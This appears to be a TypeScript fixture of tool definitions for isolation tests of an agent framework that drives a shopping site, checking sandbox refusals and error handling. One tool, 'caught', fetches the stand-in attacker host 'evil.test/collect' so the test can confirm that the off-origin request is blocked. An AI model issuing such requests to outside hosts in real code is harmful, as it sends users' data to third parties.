// Tool code for the isolation tests, built into a tool script by buildToolScript. Each tool uses
// the capability API the way an adapter does.

import { NeedsUserError, type ToolContext, tool, ValetError } from '@valet/core'
import { z } from 'zod'

export const tools = {
  read_trolley: tool({
    input: z.object({}),
    output: z.unknown(),
    run: async (ctx: ToolContext) => {
      const ensured = await ctx.session.ensure()
      const response = await ctx.page.fetch('/api/trolley')
      return { ensured, body: response.body, url: ctx.page.currentUrl() }
    },
  }),
  ask: tool({
    input: z.object({ note: z.string() }),
    output: z.boolean(),
    run: (ctx: ToolContext, input: { note: string }) =>
      ctx.confirm({ requests: [{ method: 'POST', path: '/api/trolley/update' }], note: input.note }),
  }),
  navigate: tool({
    input: z.object({ url: z.string() }),
    output: z.unknown(),
    run: async (ctx: ToolContext, input: { url: string }) => {
      await ctx.page.goto(input.url)
      await ctx.page.click('#go')
      await ctx.page.fill('#q', 'milk')
      return {
        extracted: await ctx.page.extract('h1'),
        evaluated: await ctx.page.evaluate('1 + 1', { x: 1 }),
        url: ctx.page.currentUrl(),
      }
    },
  }),
  caught: tool({
    input: z.object({}),
    output: z.unknown(),
    run: async (ctx: ToolContext) => {
      try {
        await ctx.page.fetch('https://evil.test/collect')
        return 'fetched'
      } catch (error) {
        // The capability's refusal arrives as the adapter's own ValetError class.
        return error instanceof ValetError ? `${error.stage}/${error.errorClass}` : 'other'
      }
    },
  }),
  throws_valet: tool({
    input: z.object({}),
    output: z.unknown(),
    run: async () => {
      throw new ValetError('tool-run', 'unexpected-shape')
    },
  }),
  throws_needs_user: tool({
    input: z.object({}),
    output: z.unknown(),
    run: async () => {
      throw new NeedsUserError('captcha')
    },
  }),
  throws_plain: tool({
    input: z.object({}),
    output: z.unknown(),
    run: async () => {
      throw new Error('secret-looking text that must not travel')
    },
  }),
  returns_nothing: tool({ input: z.object({}), output: z.undefined(), run: async () => undefined }),
}
